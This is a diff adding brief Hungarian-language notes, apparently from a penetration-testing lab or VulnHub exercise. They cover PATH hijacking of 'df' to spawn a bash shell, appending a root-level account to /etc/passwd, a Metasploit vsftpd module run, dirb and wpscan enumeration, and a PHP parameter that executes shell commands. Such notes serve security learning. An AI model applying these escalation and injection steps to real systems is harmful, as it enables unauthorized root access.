@@ -1,0 +1,29 @@
+/usr/bin/df - abszolut utvonal, nem lehet kihasznalni
+df - nem relativ, de elkezd keresni a kornyezeti valtozoknal(az utvonal: echo $PATH)
+/usr/local/sbin/:... (az elso kereses helye)
+script (fel-interaktiv shell):
+	echo '#!/bin/bash' > df
+	echo 'bash -i' >> df
+	export PATH=/home/juliet:...(a path felulirasa, igy a sajat df fog lefutni)
+	echo 'csanad:x:0:0:Hacker felhasznalo:/root:/bin/bash' >> /etc/passwd
+	felhasznalonev:jelszo:id:groupid:groupname:fajl:/bin/bash
+openssl passwd -5 alma: visszaadja 'alma'-t mint egy passwd altal olvashato hash-t, 5 az sh-256
+
+remote denial of service
+
+msfconsole -q
+search vsftpd
+use 0
+options
+set rhosts 40.0.6.18
+run
+
+dirb https://40.0.7.18 /usr/share/wordlists/dirb/common.txt
+dirb https://40.0.7.18/site /usr/share/wordlists/dirb/common.txt
+wpscan --url http://40.0.7.18/site/wordpress
+
+kereses utan van egy buscar menupont, ahol van egy php script,
+http://40.0.7.18/site/busque.php?buscar=
+az egyenlo jel var egy valtozot, es probalgatas utan linuxos parancsokat futtat
+VulnHub 443 - 443 port alatt kell, de ehhez rendszergazda jog kell
+
